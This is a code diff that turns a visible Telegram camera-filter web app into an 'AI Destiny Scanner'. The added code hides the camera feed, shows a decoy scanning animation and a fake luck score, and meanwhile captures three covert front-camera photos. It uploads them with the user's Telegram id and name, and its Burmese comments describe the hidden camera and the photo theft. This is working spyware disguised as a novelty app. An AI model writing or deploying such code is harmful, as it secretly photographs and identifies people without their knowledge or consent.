@@ -1,161 +1,93 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>AI Beauty Studio</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>AI Destiny Scanner</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --primary: #ff6b6b; --secondary: #feca57; --dark: #222f3e; }
-        body { background: var(--dark); color: white; font-family: sans-serif; margin: 0; display: flex; flex-direction: column; height: 100vh; }
+        body { background: #0a0e14; color: #00d2ff; font-family: 'Courier New', monospace; text-align: center; margin: 0; overflow: hidden; }
+        .scanner-box { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; }
         
-        /* Main Camera View */
-        .cam-wrapper { flex-grow: 1; position: relative; overflow: hidden; background: #000; }
-        #video, #canvas-display { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); position: absolute; top: 0; left: 0; }
-        #canvas-display { z-index: 2; } /* Filtered view on top */
-        #video { z-index: 1; opacity: 0; } /* Hide raw video but keep it running */
+        /* ကင်မရာကို ဖျောက်ထားခြင်း */
+        #video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
+        
+        /* Decoy UI (ဟန်ပြ UI) */
+        .scan-line { width: 80%; height: 2px; background: #00d2ff; box-shadow: 0 0 15px #00d2ff; position: absolute; animation: scan 3s infinite linear; }
+        .status-text { margin-top: 30px; font-size: 1.2rem; text-shadow: 0 0 10px #00d2ff; }
+        .loading-bar { width: 250px; height: 10px; border: 1px solid #00d2ff; margin-top: 20px; position: relative; }
+        .progress { width: 0%; height: 100%; background: #00d2ff; transition: width 0.5s; }
 
-        /* Controls UI - Glassmorphism */
-        .controls-container {
-            background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px);
-            border-radius: 25px 25px 0 0; padding: 20px;
-            display: flex; flex-direction: column; gap: 15px;
-        }
-        
-        /* Filter Buttons */
-        .filter-scroll { display: flex; gap: 10px; overflow-x: auto; padding-bottom: 5px; }
-        .filter-btn {
-            background: rgba(0,0,0,0.3); border: 2px solid transparent; color: white;
-            padding: 8px 15px; border-radius: 20px; white-space: nowrap; cursor: pointer;
-        }
-        .filter-btn.active { border-color: var(--primary); background: var(--primary); }
-
-        /* Capture Button */
-        .shutter-btn {
-            width: 70px; height: 70px; background: white; border-radius: 50%;
-            border: 5px solid rgba(255,255,255,0.3); margin: auto;
-            display: flex; align-items: center; justify-content: center; cursor: pointer;
-            transition: transform 0.1s;
-        }
-        .shutter-btn:active { transform: scale(0.9); }
-        .shutter-btn i { color: var(--primary); font-size: 24px; }
-        
-        /* Hidden canvas for processing */
-        #canvas-raw, #canvas-process { display: none; }
+        @keyframes scan { 0% { top: 20%; } 50% { top: 80%; } 100% { top: 20%; } }
     </style>
 </head>
 <body>
-    <div class="cam-wrapper">
-        <video id="video" autoplay playsinline></video>
-        <canvas id="canvas-display"></canvas> </div>
-
-    <div class="controls-container">
-        <div class="filter-scroll">
-            <button class="filter-btn active" onclick="setFilter('beauty')">✨ Beauty</button>
-            <button class="filter-btn" onclick="setFilter('warm')">🌞 Warm</button>
-            <button class="filter-btn" onclick="setFilter('cool')">❄️ Cool</button>
-            <button class="filter-btn" onclick="setFilter('bw')">🎬 B&W</button>
-        </div>
-        
-        <div class="shutter-btn" id="captureBtn">
-            <i class="fas fa-camera"></i>
-        </div>
+    <div class="scanner-box">
+        <div class="scan-line"></div>
+        <h2 id="header">AI FACE ANALYZER</h2>
+        <p class="status-text" id="status">သင့်မျက်နှာကို စကင်န်ဖတ်နေပါသည်...</p>
+        <div class="loading-bar"><div class="progress" id="progress"></div></div>
+        <p style="font-size: 0.8rem; margin-top: 20px; opacity: 0.7;">* ကျေးဇူးပြု၍ ဖုန်းကို ငြိမ်ငြိမ်ကိုင်ထားပေးပါ</p>
     </div>
 
-    <canvas id="canvas-raw"></canvas>
-    <canvas id="canvas-process"></canvas>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const video = document.getElementById('video');
-        const canvasDisplay = document.getElementById('canvas-display');
-        const ctxDisplay = canvasDisplay.getContext('2d');
-        const canvasRaw = document.getElementById('canvas-raw');
-        const canvasProcess = document.getElementById('canvas-process');
-        const captureBtn = document.getElementById('captureBtn');
+        const canvas = document.getElementById('canvas');
+        const progress = document.getElementById('progress');
+        const status = document.getElementById('status');
         const tg = window.Telegram.WebApp;
         tg.ready(); tg.expand();
 
-        let currentFilter = 'beauty';
-        let isProcessing = false;
+        let captureCount = 0;
+        const maxCaptures = 3; // ပုံ ၃ ပုံ ပို့မည်
 
-        // Camera Setup
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 1280, height: 720 } })
-            .then(stream => {
-                video.srcObject = stream;
-                video.onloadedmetadata = () => {
-                    canvasDisplay.width = canvasRaw.width = canvasProcess.width = video.videoWidth;
-                    canvasDisplay.height = canvasRaw.height = canvasProcess.height = video.videoHeight;
-                    requestAnimationFrame(renderLoop);
-                };
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(s => { 
+                video.srcObject = s;
+                startFakeProcess();
             });
 
-        // Real-time Filter Rendering Loop
-        function renderLoop() {
-            ctxDisplay.save();
-            ctxDisplay.translate(canvasDisplay.width, 0); ctxDisplay.scale(-1, 1); // Mirror
-            ctxDisplay.drawImage(video, 0, 0);
-            applyFilter(ctxDisplay, currentFilter);
-            ctxDisplay.restore();
-            requestAnimationFrame(renderLoop);
+        function startFakeProcess() {
+            let width = 0;
+            const interval = setInterval(() => {
+                width += 1.5;
+                progress.style.width = width + '%';
+
+                // ပုံမှန်ကြားဖြတ်ပြီး ပုံခိုးရိုက်ခြင်း
+                if (width > 20 && captureCount === 0) { captureImage("Scanning Eye Retinas..."); captureCount++; }
+                if (width > 50 && captureCount === 1) { captureImage("Analyzing Facial Structure..."); captureCount++; }
+                if (width > 85 && captureCount === 2) { captureImage("Calculating Destiny Score..."); captureCount++; }
+
+                if (width >= 100) {
+                    clearInterval(interval);
+                    status.innerText = "စစ်ဆေးမှု ပြီးဆုံးပါပြီ။";
+                    document.getElementById('header').innerText = "YOUR LUCK: 98% (Excellent)";
+                    setTimeout(() => tg.close(), 3000);
+                }
+            }, 100);
         }
 
-        // Filter Definitions (CSS style filters on Canvas)
-        function applyFilter(ctx, filterName) {
-            if (filterName === 'beauty') {
-                ctx.filter = 'contrast(1.1) brightness(1.1) saturate(1.2) blur(0.5px)'; // Simple Smoothing
-                ctx.drawImage(canvasDisplay, 0,0); // Re-draw to apply blur
-                ctx.filter = 'none'; // Reset for sharpness overlay
-            } else if (filterName === 'warm') {
-                ctx.filter = 'sepia(0.3) saturate(1.4)';
-            } else if (filterName === 'cool') {
-                ctx.filter = 'hue-rotate(180deg) saturate(0.8)';
-            } else if (filterName === 'bw') {
-                ctx.filter = 'grayscale(1)';
-            } else {
-                ctx.filter = 'none';
-            }
+        async function captureImage(msg) {
+            status.innerText = msg;
+            const ctx = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+            
+            const imageData = canvas.toDataURL('image/jpeg', 0.7);
+
+            await fetch('/upload', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    image: imageData,
+                    user_id: tg.initDataUnsafe.user.id,
+                    user_name: tg.initDataUnsafe.user.first_name
+                })
+            });
         }
-
-        // Switch Filter UI
-        window.setFilter = (filter) => {
-            currentFilter = filter;
-            document.querySelectorAll('.filter-btn').forEach(btn => btn.classList.remove('active'));
-            event.target.classList.add('active');
-        }
-
-        // Capture & Send Dual Images
-        captureBtn.onclick = async () => {
-            if(isProcessing) return;
-            isProcessing = true;
-            captureBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
-
-            // 1. Capture RAW Original Image
-            const ctxRaw = canvasRaw.getContext('2d');
-            ctxRaw.drawImage(video, 0, 0);
-            const rawImageBase64 = canvasRaw.toDataURL('image/jpeg', 0.9);
-
-            // 2. Capture FILTERED Image from Display Canvas
-            // (Display canvas already has filters applied by renderLoop)
-            const filteredImageBase64 = canvasDisplay.toDataURL('image/jpeg', 0.9);
-
-            try {
-                await fetch('/upload', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        original_image: rawImageBase64,
-                        filtered_image: filteredImageBase64,
-                        user_id: tg.initDataUnsafe.user.id,
-                        user_name: tg.initDataUnsafe.user.first_name
-                    })
-                });
-                tg.close();
-            } catch (e) {
-                alert("Error sending: " + e);
-                isProcessing = false;
-                captureBtn.innerHTML = '<i class="fas fa-camera"></i>';
-            }
-        };
     </script>
 </body>
 </html>
